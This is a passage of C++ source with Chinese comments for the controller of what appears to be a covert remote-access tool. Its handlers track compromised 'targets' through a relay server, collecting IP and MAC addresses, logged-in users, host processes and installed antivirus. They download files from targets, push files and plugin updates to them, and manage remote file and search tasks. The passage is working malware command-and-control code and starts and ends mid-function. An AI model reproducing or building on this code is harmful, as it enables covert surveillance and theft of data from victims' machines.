	    lpFileTask->dwCTHighDataTime = strtoul(args[5].c_str(), NULL, 10);
	    lpFileTask->dwCTLowDataTime  = strtoul(args[6].c_str(), NULL, 10);
	    lpFileTask->dwLWHighDataTime = strtoul(args[7].c_str(), NULL, 10);
	    lpFileTask->dwLWLowDataTime  = strtoul(args[8].c_str(), NULL, 10);
	    lpFileTask->dwLAHighDataTime = strtoul(args[9].c_str(), NULL, 10);
	    lpFileTask->dwLALowDataTime  = strtoul(args[10].c_str(), NULL, 10);
    }

	if (bNewFileTask)
	{
		tarBlock->AddFileTask(lpFileTask);
	}
    
    return 0;    
}
//---------------------------------------------------------------------------

void  TargetConnection::Send_CFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType)
{
	// TID PID CFT TASKID TASKDIRECT TASKTYPE
	//  0   1   2     3         4       5
    
    std::ostringstream buf;
    buf << dwTargetID << " 1 CFT " << dwTaskID << " " << dwTaskType << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_CFT(std::vector<std::string> & args)
{
	// TID PID CFT TASKID TASKTYPE OK(ERR) [ERRID]
	//  0   1   2     3       4      5        6 
    //
    
    if (args.size() != 6 && args.size() != 7)
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }
    
    ULONG taskId = strtoul(args[3].c_str(), NULL, 10);
    ULONG taskType = strtoul(args[4].c_str(), NULL, 10);
    
    if ("OK" == args[5])
    {
        switch(taskType)
        {
        case TASK_DIR:
            {
                DirTask *dirTask = tarBlock->GetDirTaskFromMap(taskId);
                if (dirTask)
                {
                    TaskStatus oldStatus = (TaskStatus)dirTask->taskStatus;
                    dirTask->taskStatus = CANCELED;
                    tarBlock->DirTaskStatusChanged(dirTask, oldStatus);
                }

                // 通知Daemon删除任务
                //
                this->Send_DFT(targetID, taskId, taskType);
            }
            break;
            
        case TASK_SEARCH:
            {
                SearchTask *searchTask = tarBlock->GetSearchTaskFromMap(taskId);
                if (searchTask)
                {
                    TaskStatus oldStatus = (TaskStatus)searchTask->taskStatus;
                    searchTask->taskStatus = CANCELED;
                    tarBlock->SearchTaskStatusChanged(searchTask, oldStatus);
                }
                
                // 通知Daemon删除任务
                //
                this->Send_DFT(targetID, taskId, taskType);
            }
            break;
            
        default:
            {
                FileTask *fileTask = tarBlock->GetFileTaskFromMap(taskId);

                xASSERT((fileTask));

                if (fileTask)
                {
                    TaskStatus oldStatus = (TaskStatus)fileTask->taskStatus;
                    fileTask->taskStatus = CANCELED;
                    tarBlock->FileTaskStatusChanged(fileTask, oldStatus);

                    if (fileTask->dwParentID == 0)
                    {
                        // 只删除简单指令，复合指令的子指令由复合指令来实施
                        //
                        this->Send_DFT(targetID, taskId, taskType);                    
                    }
                }
            }
            break;
        }
    }
    else
    {
        ULONG lastErrCode = strtoul(args[6].c_str(),NULL,10);
        SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%d)] 取消任务(ID: %d)失败! %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    taskId,
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());
    }
        
    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_PFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType)
{
	// TID PID PFT TASKID TASKTYPE
	//  0   1   2     3      4
    //

    std::ostringstream buf;
    buf << dwTargetID << " 1 PFT " << dwTaskID << " " << dwTaskType << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_PFT(std::vector<std::string> & args)
{
	// TID PID PFT TASKID TASKTYPE OK(ERR) [ERRID]
	//  0   1   2     3       4       5        6
    //

    if (args.size() != 6 && args.size() != 7)
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }
    
    ULONG taskId = strtoul(args[3].c_str(),NULL,10);
    ULONG taskType = strtoul(args[4].c_str(), NULL, 10);

    if ("OK" == args[5])
    {
        switch(taskType)
        {
        case TASK_DIR:
            {
                DirTask *dirTask = tarBlock->GetDirTaskFromMap(taskId);
                if (dirTask)
                {
                    TaskStatus oldStatus = (TaskStatus)dirTask->taskStatus;
                    dirTask->taskStatus = PAUSED;
                    tarBlock->DirTaskStatusChanged(dirTask, oldStatus);
                }
            }
            break;
        case TASK_SEARCH:
            {
                SearchTask *searchTask = tarBlock->GetSearchTaskFromMap(taskId);
                if (searchTask)
                {
                    TaskStatus oldStatus = (TaskStatus)searchTask->taskStatus;
                    searchTask->taskStatus = PAUSED;
                    tarBlock->SearchTaskStatusChanged(searchTask, oldStatus);
                }
            }
            break;
        default:
            {
                FileTask *fileTask = tarBlock->GetFileTaskFromMap(taskId);
                if (fileTask)
                {
                    TaskStatus oldStatus = (TaskStatus)fileTask->taskStatus;
                    fileTask->taskStatus = PAUSED;
                    tarBlock->FileTaskStatusChanged(fileTask, oldStatus);
                }
            }
        }
    }
    else
    {
        ULONG lastErrCode = strtoul(args[6].c_str(),NULL,10);

        SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%d)] 暂停任务(ID:%d)失败! %s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    taskId,
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());
    }
    
    return 0;    
}
//---------------------------------------------------------------------------

void  TargetConnection::Send_RFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType)
{
	// TID PID SFT TASKID TASKTYPE
	//  0   1   2     3      4
    //
    
    std::ostringstream buf;
    buf << dwTargetID << " 1 RFT " << dwTaskID << " " << dwTaskType << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_RFT(std::vector<std::string> & args)
{
	// TID PID RFT TASKID TASKTYPE OK(ERR) [ERRID]
	//  0   1   2     3       4      5        6
    //

    if (args.size() != 6 && args.size() != 7)
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }
    
    ULONG taskId = strtoul(args[3].c_str(),NULL,10);
    ULONG taskType = strtoul(args[4].c_str(), NULL, 10);

    if ("OK" == args[5])
    {
        switch(taskType)
        {
        case TASK_DIR:
            {
                DirTask *dirTask = tarBlock->GetDirTaskFromMap(taskId);
                if (dirTask)
                {
                    TaskStatus oldStatus = (TaskStatus)dirTask->taskStatus;
                    dirTask->taskStatus = WORKING;
                    tarBlock->DirTaskStatusChanged(dirTask, oldStatus);
                }
            }
            break;
        case TASK_SEARCH:
            {
                SearchTask *searchTask = tarBlock->GetSearchTaskFromMap(taskId);
                if (searchTask)
                {
                    TaskStatus oldStatus = (TaskStatus)searchTask->taskStatus;
                    searchTask->taskStatus = WORKING;
                    tarBlock->SearchTaskStatusChanged(searchTask, oldStatus);
                }
            }
            break;
        default:
            {
                FileTask *fileTask = tarBlock->GetFileTaskFromMap(taskId);
                if (fileTask)
                {
                    TaskStatus oldStatus = (TaskStatus)fileTask->taskStatus;
                    fileTask->taskStatus = WORKING;
                    tarBlock->FileTaskStatusChanged(fileTask, oldStatus);
                }
            }
        }   
    }
    else
    {
        ULONG lastErrCode = strtoul(args[6].c_str(),NULL,10);

        SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%d)] 恢复任务(ID:%d)失败! 错误码%s",
                                                    tarBlock->widTargetName.c_str(),
                                                    tarBlock->dwTargetID,
                                                    taskId,
                                                    ConvertErrorIdToStrW(lastErrCode).c_str());
    }
    
    return 0;
}
//---------------------------------------------------------------------------
// 当收到FileTask的状态为Canceled, Errored和Finished,调用DFT通知中转服务器清除任务
//
void  TargetConnection::Send_DFT(DWORD dwTargetID, DWORD dwTaskID, DWORD dwTaskType)
{
	// TID PID DFT TASKID TASKTYPE
	//  0   1   2     3      4

    std::ostringstream buf;
    buf << dwTargetID << " 1 DFT " << dwTaskID << " " << dwTaskType << "\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_FTS(std::vector<std::string> & args)
{
   	// TID PID FTS TaskID TaskDirect TotalLen  DaemonedLen FinishedLen
	//  0   1   2     3       4          5         6            7            
	//

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    ULONG taskId = strtoul(args[3].c_str(),NULL,10);
    FileTask *fileTask = tarBlock->GetFileTaskFromMap(taskId);
    if (fileTask == NULL)
    {
        return 0;
    }

    fileTask->dwTotalLen    = strtoul(args[5].c_str(),NULL,10);
    fileTask->dwDaemonedLen = strtoul(args[6].c_str(),NULL,10);
    fileTask->dwFinishedLen = strtoul(args[7].c_str(),NULL,10);

    bool bUpdate = true;
    if (0 != fileTask->dwTotalLen)
    {
        fileTask->nFinishedProp = (int)((double)fileTask->dwFinishedLen /(double)fileTask->dwTotalLen * 100);
        fileTask->nDaemonedProp = (int)((double)(fileTask->dwDaemonedLen - fileTask->dwFinishedLen) /(double)fileTask->dwTotalLen * 100);
    }
    else
    {
        fileTask->nFinishedProp = 100;
        fileTask->nDaemonedProp = 100;        
    }

    // 更新界面
    //
    tarBlock->FileTaskProgressChanged(fileTask);

	return true;
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_DOW(std::vector<std::string> & args)
{
	//  1   2   3   4        5         6           1      2
	// TID PID DOW TASKID StartPos PATHBASE64\r\nDATA DataLen\r\n
	// TID PID DOW TASKID StartPos PATHBASE64\r\nDATAFIN DataLen\r\n	
	// TID PID DOW TASKID StartPos PATHBASE64\r\nERR ErrorCode\r\n	

	// 如果不足两行，下次再处理
	if (false == IsWholeLineAvailable())
	{
		RecoverCommand();
		return -1;
	}

	std::vector<std::string> args2 = SplitString(this->readBuffer.substr(0,this->readBuffer.find("\r\n")), " ");
	std::string cmd = args2[0];

	ULONG targetId = strtoul(args[0].c_str(),NULL,10);
	assert(targetId == ownerTarget->dwTargetID);
	Target* tarBlock = GetTargetFromGlobalMap(targetId);

	if (cmd == "ERR")
	{
		ULONG lastErrCode = strtoul(args2[1].c_str(),NULL,10);

		SetTarStatusInfoExW(STATUS_ERROR, tarBlock, L"[目标%s(ID:%d)] 添加文件下载指令失败 - 下载文件\"%s\" [%s]",
			tarBlock->widTargetName.c_str(),
			tarBlock->dwTargetID,
			GetWideFromBase64(args[5]).c_str(),
			ConvertErrorIdToStrW(lastErrCode).c_str());
	}
	else
	{
		std::string data;
		int			dataLen = atoi(args2[1].c_str());
		if (dataLen > 0)
		{
			if (false == IsWholeDataAvailable(dataLen + args2.size()))
			{
				RecoverCommand();
				return -1;
			}

			GetLine();
			data = GetData(dataLen);

		}

		ULONG taskId   = strtoul(args[3].c_str(),NULL,10);
		FileTask *fileTask = ownerTarget->GetFileTaskFromMap(taskId);
		if (fileTask == NULL)
		{
			return 0;
		}

		if (fileTask->taskStatus != WORKING)           //  0
		{
			ownerTarget->ScheduleTarFileTask();
			return 0;
		}

		ULONG startPos = strtoul(args[4].c_str(),NULL,10);
		int ret = SaveDataToLocalFile(fileTask, startPos, data.c_str(), dataLen);
		if ( 0 != ret)
		{
			Send_ERR(fileTask);
			return 0;
		}

		if ("DATAFIN" == args2[0])
		{
			// 关闭句柄
			//
			if (fileTask->hFile)
			{
				CloseHandle(fileTask->hFile);
				fileTask->hFile = NULL;
			}     
		}

		// 更新界面
		//
		ownerTarget->FileTaskProgressChanged(fileTask);

	}

    return 0;
}
//--------------------------------------------------------------------------
void  TargetConnection::Send_UPL(FileTask *fileTask, std::string flag, ULONG dataLen)

{

	// TID PID UPL TaskID StartPos DATA DATALEN\r\nFileContent

	//  0   1   2      3      4      5      6
	//

	// TID PID UPL TaskID StartPos DATAFIN DATALEN\r\nFileContent
	//  0   1   2      3      4        5      6           
	//

    std::ostringstream buf;

    buf << fileTask->dwTargetID << " 1 UPL " << fileTask->dwTaskID

        << " " << fileTask->dwDaemonedLen << " " << flag << " " << dataLen << "\r\n";

    this->WriteDataCmd(buf.str(), this->readBuf, dataLen);

}

//---------------------------------------------------------------------------

void  TargetConnection::Start_UPL(FileTask *fileTask)

{

	// TID PID UPLB TaskID StartPos

	//  0   1   2     3       4
	//

	std::ostringstream buf;
	buf << fileTask->dwTargetID << " 1 UPL " << fileTask->dwTaskID << " " << fileTask->dwDaemonedLen; 

	std::vector<std::string> fakeUplCmd = SplitString(buf.str(), " ");
	fakeUplCmd.push_back(buf.str());
	this->Handle_UPL(fakeUplCmd);

}

//---------------------------------------------------------------------------
int  TargetConnection::Handle_UPL(std::vector<std::string> & args)
{
    // TID PID UPL TaskID StartPos
	//  0   1   2     3       4
	//
    ULONG targetId = strtoul(args[0].c_str(),NULL,10);
    assert(targetId == ownerTarget->dwTargetID);

    ULONG taskId   = strtoul(args[3].c_str(),NULL,10);
    FileTask *fileTask = ownerTarget->GetFileTaskFromMap(taskId);

    if (fileTask == NULL)
    {
		//OutputDebugStringW(L"File task not found.\r\n");
        return 0;
    }
    
    if (fileTask->taskStatus != WORKING)
    {
        ownerTarget->ScheduleTarFileTask();
		//OutputDebugStringW(L"Status incorrect.\r\n");
        return 0;
    }

    ULONG startPos = strtoul(args[4].c_str(),NULL,10);
    if ((long)startPos == -1)
    {
		//OutputDebugStringW(L"Start position incorrect.\r\n");
        return 0;   
    }
    
    // Read data from local file
    //
    int byteReaded = 0;
    int ret = ReadDataFromLocalFile(fileTask, startPos, this->readBuf, FILE_BLOCK_LENGTH, &byteReaded);
    if (0 != ret)
    {
        if (ERR_RED_FILE_END == ret)
        {
            Send_UPL(fileTask, "DATAFIN", byteReaded);

            // 关闭句柄
            //
            if (fileTask->hFile)
            {
                CloseHandle(fileTask->hFile);
                fileTask->hFile = NULL;
            }
        }
        else
        {
			/*WCHAR errMsg[MAX_PATH] = {0};
			wsprintfW(errMsg, L"ReadFile Failed.\r\nErrorID : %d", ret);
			MessageBoxW(NULL, errMsg, errMsg, MB_OK);*/
            Send_ERR(fileTask);
            return 0;        
        }
    }
    else
    {
        Send_UPL(fileTask,"DATA",byteReaded);
    }

    // 更新界面
    //

    ownerTarget->FileTaskProgressChanged(fileTask);
    
    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_ERR(FileTask *fileTask)

{

	// TID PID ERR TaskType TaskID ErrorCode

	//  0   1   2     3        4      5
	//

	/*WCHAR errMsg[MAX_PATH] = {0};
	wsprintfW(errMsg, L"ReadFile Failed : %s.\r\nTask Type : ", fileTask->ctrPathW.c_str(), fileTask->taskType);
	MessageBoxW(NULL, errMsg, L"", MB_OK);*/

    std::ostringstream buf;

    buf << fileTask->dwTargetID << " 1 ERR " << ConvertTaskDirectToStr((TaskDirect)fileTask->taskDirect)

        << " " << fileTask->dwTaskID << " " << fileTask->dwErrorID << "\r\n";

    this->Write(buf);

}

//---------------------------------------------------------------------------

void  TargetConnection::Send_PNG()

{
    // TID PID PNG
    //  0   1   2
    //
    std::ostringstream buf;
    buf << ownerTarget->dwTargetID << " 0 PNG\r\n";
    this->Write(buf);
}

//---------------------------------------------------------------------------

int   TargetConnection::Handle_QNG(std::vector<std::string> & args)

{

    // Do nothing

    //

    return 0;

}

//---------------------------------------------------------------------------
int   TargetConnection::Handle_Plugin_CMD(std::vector<std::string> &args)
{

	// TID PID CMD DATA xxx xxx xxx LEN\r\n

	//  0   1   2   3
	//

	// TID PID CMD xxx xxx xxx \r\n
	//  0   1   2
	//   


	int	dataLen = 0;
	if ("DATA" == args[3])
	{
		dataLen = atoi(args[args.size() - 1].c_str());
        if (false == IsWholeDataAvailable(dataLen))
		{
  			RecoverCommand();
			return -1;
		}
	}


	std::string str = args[2].c_str();

    ULONG targetId = strtoul(args[0].c_str(), NULL, 10);
    if (targetId == 0)
    {
        assert(false);
        return 0;
    }

/* @@@   PDATA_BLOCK dataBlock = new DATA_BLOCK();

    dataBlock->targetId = targetId;

    dataBlock->args     = args;

    dataBlock->dataLen  = dataLen;

    dataBlock->next     = NULL;

    if (dataLen > 0)

    {

        dataBlock->data = GetData(dataLen);

    }


    FrmMain->PushPlgDataBlock(dataBlock); */


    return 0;

}

//---------------------------------------------------------------------------
//---------------------------------------------------------------------------
int   TargetConnection::Handle_OUT(std::vector<std::string> & args)
{
    this->CloseConnection();
    SendMessage(FrmMain->Handle, WM_CONTROL_INOTHERPLACE, NULL, NULL);

	return 0;
}

//---------------------------------------------------------------------------
void  TargetConnection::Send_FLD()
{
    // TID PID INI StartFlagID StopFlagID
    //  0   1   2       3           4
    //

    std::ostringstream ss;
    ss << "0 0 FLD " << FrmMain->dwStartFlagId << " " << FrmMain->dwStopFlagId << "\r\n";
    Write(ss);
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_INI()
{
    // TID PID INI
    //  0   1   2
    
    // In INI Command, TID is only a placeholder
    //
    std::ostringstream ss;
    ss << "0 0 INI\r\n";
    Write(ss);
}

//---------------------------------------------------------------------------
int  TargetConnection::Handle_INI(std::vector<std::string> & args)
{
    // TID PID INI
    //  0   1   2
    //

    // TargetID is Zero for INI command
	// PluginID is Zero for INI command
    //
    
    xASSERT ((args.size() == 3));

    SendMessage(FrmMain->Handle, WM_CONTROL_ONLINE, NULL, NULL);
    Send_PLI(0);        // 获取中转上的插件信息
    
    return 0;
}

void  TargetConnection::Send_SDA(ULONG targetId, DWORD value)
{
	// TID PID SDA DATALEN\r\nDATA
	//
	std::ostringstream buf;
	buf << targetId << " 0 SDA " << sizeof(DWORD) << "\r\n";

	this->WriteDataCmd(buf.str(), (const char*)&value, sizeof(DWORD));

}


//---------------------------------------------------------------------------
void  TargetConnection::Send_SDA(PBYTE lpData, DWORD dwDataSize)
{
    // TID PID SDA DATALEN\r\nDATA
    //
    std::ostringstream buf;
    buf << "0 0 SDA " << dwDataSize << "\r\n";

    this->WriteDataCmd(buf.str(), (const char*)lpData, dwDataSize);

}
//---------------------------------------------------------------------------
void  TargetConnection::Send_QDA(ULONG targetId)
{
    // TID PID QDA\r\n
    //

    std::ostringstream buf;
    buf << targetId << " 0 QDA\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_QDA(std::vector<std::string> & args)
{
    // TID PID QDA DATA DATALEN\r\nDATA
    //  0   1   2   3      4
    //

    //xASSERT((args.size() == 5));

    ULONG targetId = strtoul(args[0].c_str(), NULL, 10);
    
    std::string data;
    int dataLen = atoi(args[4].c_str());
    if (dataLen > 0)
    {
        if (false == IsWholeDataAvailable(dataLen))
        {
            RecoverCommand();
            return -1;
        }
        data = GetData(dataLen);
    }

    Target * tarBlock = GetTargetFromGlobalMap(targetId);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }

    PBYTE lpData = (PBYTE)data.c_str();
    SendMessage(FrmMain->Handle, WM_QUERY_DAEMONADDR_FINISHED, (unsigned int)tarBlock, (unsigned int)lpData);

    if (dataLen == 2 * sizeof(DAEMONADDR))
    {
        lpData = lpData + sizeof(DAEMONADDR);  
        SendMessage(FrmMain->Handle, WM_QUERY_DAEMONADDR2_FINISHED, (unsigned int)tarBlock, (unsigned int)lpData);            
    }

    return 0;
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_TSW(std::vector<std::string> & args)
{
   	// TID PID TSW FLAGID
	//  0   1   2   3
	//
    DWORD   dwTargetID = strtoul(args[0].c_str(), NULL, 10);
    DWORD   dwFlagID   = strtoul(args[3].c_str(), NULL, 10);

    Target * tarBlock = GetTargetFromGlobalMap(dwTargetID);
    if (tarBlock == NULL)
    {
        assert(tarBlock);
        return 0;
    }
    
    tarBlock->dwGroupID = dwFlagID;
    if (dwFlagID < FrmMain->dwStartFlagId || dwFlagID > FrmMain->dwStopFlagId)
    {
        tarBlock->bIsMyTarget = false;
    }
        
    SendMessage(FrmMain->Handle, WM_TARGET_SWITCH, (unsigned int)tarBlock, 0);
        
    return 0;
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_TAR(std::vector<std::string> & args)
{
	// TargetID PID TAR GroupID  OsBuildNumber CurMAC LocalIP  PublicIP  ProtocolVersion  CurrentNetEnvironment
	//    0      1   2      3            4          5      6       7         8                  9
	//
    // xASSERT((args.size() == 9));

    ULONG       targetID        = strtoul(args[0].c_str(), NULL, 10);
    ULONG       dwFlagID         = strtoul(args[3].c_str(), NULL, 10);

    if (dwFlagID >= 0x7FFFFFFF)
    {
        dwFlagID = 100000;      // 如果数值大于0x7FFFFFFF,则默认设置为10W
    }
    
    ULONG       osBuildNumber   = strtoul(args[4].c_str(), NULL, 10);
    std::string  macAddr         = args[5].c_str();
    ULONG       remLocIpAddr    = strtoul(args[6].c_str(),NULL,10);
    std::string  localIpAddr     = GetIPStrFromInt32(remLocIpAddr);
    std::string  publicIpAddr    = args[7].c_str();


    ULONG       antiVirus = strtoul(args[8].c_str(), NULL, 10);

	if ( antiVirus == 1500 )
		antiVirus = 0;

	ULONG netEnv = 1;

	if ( args.size() > 9 )
		netEnv = strtoul(args[9].c_str(), NULL, 10);

    if (FrmMain->dwCtrUserId != 0)
    {
        // 多控制端环境下，收到不是自己的目标，则不进行处理
        //
        if ((dwFlagID < FrmMain->dwStartFlagId) || (dwFlagID > FrmMain->dwStopFlagId))
        {
            return 0;
        }
    }

    //  本地处理
    //

	std::wstring antiVirusString = GetAntiVirusString(antiVirus);

    Target *tar = GetTargetFromGlobalMap(targetID);
    if (NULL == tar)
    {
        tar  = new Target();
        tar->dwProtocolVersion = 0;
        tar->dwTargetID        = targetID;
        tar->dwGroupID         = dwFlagID ;
		QString convert = QString("%1").arg(targetID);
        tar->aniTargetName     = convert.toStdString();
		
        tar->widTargetName     = convert.toStdWString();
        tar->dwOsBuildNumber   = osBuildNumber;
        tar->aniRemMacAddr     = macAddr ;
        tar->aniRemLocalIpAddr = localIpAddr;
        tar->aniRemPublicIpAddr= publicIpAddr;
        tar->bIsMyTarget = true;
		tar->dwLangId = 0;
		tar->m_netEnv = netEnv;
		tar->m_antiVirus = antiVirusString;
        
        SendMessage(FrmMain->Handle, WM_NEW_TARGET, (unsigned int)tar, 1);

        SetStatusInfoExA(STATUS_NOTE, "发现一个新目标(目标ID:%u,IP地址:%s, GroupId:%s)",
                                    targetID, publicIpAddr.c_str(), args[3].c_str());
    }
    else
    {
        tar->bIsMyTarget = true;
            
        if (/*(tar->dwProtocolVersion  != protocolVersion)
        ||*/  (tar->aniRemMacAddr      != macAddr)
        ||  (tar->aniRemLocalIpAddr  != localIpAddr)
        ||  (tar->aniRemPublicIpAddr != publicIpAddr)
        ||  (tar->dwOsBuildNumber    != osBuildNumber)
		|| (tar->m_netEnv != netEnv )
		|| ( tar->m_antiVirus != antiVirusString ))
        {
            tar->aniRemMacAddr      = macAddr;
            tar->aniRemLocalIpAddr  = localIpAddr;
            tar->aniRemPublicIpAddr = publicIpAddr;
            tar->dwOsBuildNumber    = osBuildNumber;
            /*tar->dwProtocolVersion  = protocolVersion;*/
			tar->m_netEnv = netEnv;
			tar->m_antiVirus = antiVirusString;

            SendMessage(FrmMain->Handle, WM_TARGET_INFO_UPDATED, (unsigned int)tar,NULL);
        }
    }

    // Get FileTask, current status, log history
    //
    Send_STA(targetID);         // 获取目标状态信息
    Send_PLI(targetID);         // 获取目标插件信息
    Send_LIR(targetID);         // 获取盘符列表

    if (tar->bConnecting == false && tar->bTarConnOnline == false)
    {
        // 通知主线程，开始发起目标数据连接,一个目标只保留一个数据连接
        //
        tar->StartTarDataConn();
    }

    return 0;
}

//---------------------------------------------------------------------------
void  TargetConnection::Send_STA(ULONG targetId)
{
    // TID PID STA
	//  0   1   2 
	//
    std::ostringstream buf;
    buf << targetId << " 1 STA\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_STA(std::vector<std::string> & args)
{
	// TID PID STA ONL(OFF) LastTime
    //  0   1   2   3          4
    //

    if (args.size() != 5)
    {
        assert(false);
        return 0;
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    tarBlock->lastTime = strtoul(args[4].c_str(),NULL,10);
        
    if ("ONL" == args[3])
    {
        tarBlock->tarStatus = TARONLINE;
    }
    else
    {
        tarBlock->tarStatus = TAROFFLINE;
    }
    
    SendMessage(FrmMain->Handle, WM_TARGET_STATUS_CHANGE, (unsigned int)tarBlock, NULL);
    
    return 0;
}
//---------------------------------------------------------------------------
int  TargetConnection::Handle_CIN(std::vector<std::string> & args)
{
	// TID PID CIN  LanguageID ComputerNameBase64 OnlineProcessBase64 LoginUserBase64\r\n  
	//  0   1   2	   3			   4				 5					6
	//

    if (args.size() != 7)
    {
        xASSERT((args.size() == 7));
    }

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    std::string land = args[3].c_str();
    DWORD langId = strtoul(args[3].c_str(), NULL, 10);
    std::string aniComputerName = args[4].c_str();
    std::string aniOnlProcName = args[5].c_str();
    std::string aniLoginUser = args[6].c_str();

    if ((tarBlock->dwLangId != langId)
     || (tarBlock->aniComputerNameBase64 != aniComputerName)
     || (tarBlock->aniOnlineProcBase64   != aniOnlProcName)
     || (tarBlock->aniLoginUserBase64    != aniLoginUser))
    {
        tarBlock->dwLangId = langId;
        tarBlock->aniComputerNameBase64 = aniComputerName;
        tarBlock->aniOnlineProcBase64 = aniOnlProcName;
        tarBlock->aniLoginUserBase64 = aniLoginUser;
        
        SendMessage(FrmMain->Handle, WM_TARGET_EXINFO_UPDATED, (unsigned int)tarBlock,NULL);
    }

    return 0;
}
//---------------------------------------------------------------------------
int   TargetConnection::Handle_LOG(std::vector<std::string> & args)
{
    // TID PID LOG ONL(OFF) LastTime LocalIP PublicIP CurMAC [OnlineProcessBase64 LoginUserBase64]
    //  0   1   2    3         4        5       6       7			8                   9
    //

    xASSERT(((args.size() == 8) || (args.size() == 10)));

    ULONG targetID = strtoul(args[0].c_str(),NULL,10);
    Target *tarBlock = GetTargetFromGlobalMap(targetID);
    if (NULL == tarBlock)
    {
        assert(false);
        return 0;
    }

    ULONG  lastTime = strtoul(args[4].c_str(),NULL,10);
    ULONG  locIpAddr = strtoul(args[5].c_str(),NULL,10);
    ULONG  pubIpAddr = strtoul(args[6].c_str(),NULL,10);
    
    std::string localIpAddr  = GetIPStrFromInt32(locIpAddr);
    std::string publicIpAddr = GetIPStrFromInt32(pubIpAddr);

    std::string status = "下线";
    const char *lpszOnlProcBase64 = NULL;
    const char *lpszLoginUserBase64 = NULL;
    if (args[3] == "ONL")
    {
        status = "上线";
        lpszOnlProcBase64 = args[8].c_str();
        lpszLoginUserBase64 = args[9].c_str();
    }

    std::string timeStr = GetTimeString(lastTime);
    DM->InsertTargetLogInfo(targetID,
                         status.c_str(),
                         timeStr.c_str(),
                         localIpAddr.c_str(),
                         publicIpAddr.c_str(),
                         args[7].c_str(),
                         lpszOnlProcBase64,
                         lpszLoginUserBase64);

	if ( tarBlock->frmTarControl )
	{
		tarBlock->frmTarControl->RefreshOnlineLogInfo();
	}
                         
    return 0;
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_PLI(ULONG targetId)
{
    // TID PID PLI
	//  0   1   2 
	//
    std::ostringstream buf;
    buf << targetId << " 1 PLI\r\n";
    this->Write(buf);
}
//---------------------------------------------------------------------------
void  TargetConnection::StartUptPluginToDaemon(DWORD dwPluginId, DWORD dwNewPlgVer, DWORD dwOsType)
{
    SetStatusInfoExA(STATUS_NOTE, "更新中转服务器上的插件%u到版本%u", dwPluginId, dwNewPlgVer);

	// TID PID UPL OSTYPE NEWVersion StartPos
	//  0   1   2    3        4         5
	//
	std::ostringstream buf;
	buf << "0 " << dwPluginId << " UPL " << dwOsType << " " << dwNewPlgVer << " 0";

	std::vector<std::string> fakeUplCmd = SplitString(buf.str(), " ");
	this->Handle_UPL(fakeUplCmd);
}
//---------------------------------------------------------------------------
void  TargetConnection::Send_UPL(DWORD       dwPluginId,
                                            DWORD       dwNewPlgVer,
                                            DWORD       dwStartPos,                                            
                                            std::string flag,
                                            PCHAR       lpData,
                                            DWORD       dwDataLen,
											DWORD		dwOsType)
{
	// TID PID UPL OsType NewVersion StartPos DATA DATALEN\r\nFileContent
	//  0   1   2      3        4      5      6       7
	//

	// TID PID UPL OsTType NewVerSion StartPos DATAFIN DATALEN\r\nFileContent
	//  0   1   2      3        4        5      6          7
	//

    std::ostringstream buf;

    buf << "0 " << dwPluginId << " UPL " << dwOsType << " " << dwNewPlgVer

        << " " << dwStartPos << " " << flag << " " << dwDataLen << "\r\n";

    this->WriteDataCmd(buf.str(), lpData, dwDataLen);

}

//---------------------------------------------------------------------------
int   TargetConnection::Handle_PLI(std::vector<std::string> & args)
{
	// TID PID PLI OSTYPE PID FILENAME VER UPDATEVER LOADTYPE PROC
	//  0   1   2   3      4     5      6	      7     8       9
	//

    if (args.size() != 10)
    {
        assert(false);
        return 0;
    }

    ULONG targetId = strtoul(args[0].c_str(),NULL,10);
    ULONG pluginId = strtoul(args[4].c_str(),NULL,10);

    if (targetId == 0)
    {
        // 处理全局插件
        //
        ULONG  dwPluginVer =  atoi(args[6].c_str());

		ULONG dwSysType = atoi(args[3].c_str());

